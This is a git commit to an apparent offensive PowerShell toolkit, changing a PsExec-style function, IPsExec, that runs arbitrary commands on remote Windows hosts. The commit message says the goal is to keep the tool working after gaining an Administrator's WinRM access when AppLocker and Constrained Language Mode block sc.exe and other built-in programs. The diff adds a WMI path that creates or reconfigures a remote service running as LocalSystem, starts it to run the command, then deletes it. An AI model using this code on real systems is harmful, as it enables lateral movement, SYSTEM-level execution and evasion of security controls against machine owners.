a223a87f18666007e93fa320cea357a01d5de1b0
tree-chtsec <tree@chtsecurity.com>
2022-08-06 11:59:08 +0800

    make IPsExec usable even in CLM Scenario: get Administrator's WinRM but appLocker block many builtin executable ex. SC.exe REG.exe InstallUtil.exe MSBuild.exe ...

--- scripts/psexec.ps1
+++ scripts/psexec.ps1
@@ -20,14 +20,27 @@ Function IPsExec
         [Switch]
         $New
     )
-    $MS = "";
-    If ($New) {
-        $MS += "sc \\$ComputerName create $ServiceName obj= `"LocalSystem`" start= `"demand`" binPath= `"c:\windows\system32\cmd.exe`"`n";
+    $C = "c:\windows\system32\cmd.exe";
+    If ($ExecutionContext.SessionState.LanguageMode -eq "FullLanguage") {
+        $MS = "";
+        If ($New) {
+            $MS += "sc \\$ComputerName create $ServiceName obj= `"LocalSystem`" start= `"demand`" binPath= `"$C`"`n";
+        }
+        $MS += "sc \\$ComputerName config $ServiceName start= `"demand`" binPath= `"$C /k %COMSPEC% /c $Command`"`n";
+        $MS += "sc \\$ComputerName start $ServiceName`n";
+        If ($New) {
+            $MS += "sc \\$ComputerName delete $ServiceName`n";
+        }
+        $MS | cmd;
+    } else {
+        If ($New) {
+            Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Service -Name Create -ArgumentList @($true, " ", 2, $null, $null, $ServiceName, $C, $null, 16, "Manual", "LocalSystem", $null);
+        }
+        $MS = Get-WmiObject -ComputerName $ComputerName -class win32_service -Filter "name=`"$ServiceName`"";
+        $MS.Change($null, "$C /k %COMSPEC% /c $Command", $null, $null, "Manual", $null, "LocalSystem")
+        $MS.StartService();
+        If ($New) {
+            $MS.Delete();
+        }
     }
-    $MS += "sc \\$ComputerName config $ServiceName start= `"demand`" binPath= `"c:\windows\system32\cmd.exe /c $Command`"`n";
-    $MS += "sc \\$ComputerName start $ServiceName`n";
-    If ($New) {
-        $MS += "sc \\$ComputerName delete $ServiceName`n";
-    }
-    $MS | cmd;
 }
